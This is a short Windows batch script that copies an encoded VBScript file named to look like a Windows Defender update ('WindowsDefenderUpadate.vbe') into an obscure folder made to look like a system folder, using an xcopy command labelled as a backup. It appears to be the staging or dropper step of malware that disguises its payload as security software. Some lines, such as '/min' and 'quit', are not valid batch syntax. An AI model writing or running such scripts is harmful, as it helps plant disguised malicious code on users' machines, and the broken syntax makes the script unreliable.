@echo off
 :: variables
 /min
 SET odrive=%odrive:~0,2%
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
@echo off

%backupcmd%  "WindowsDefenderUpadate.vbe" "c:\Intel\Old Window\"

quit
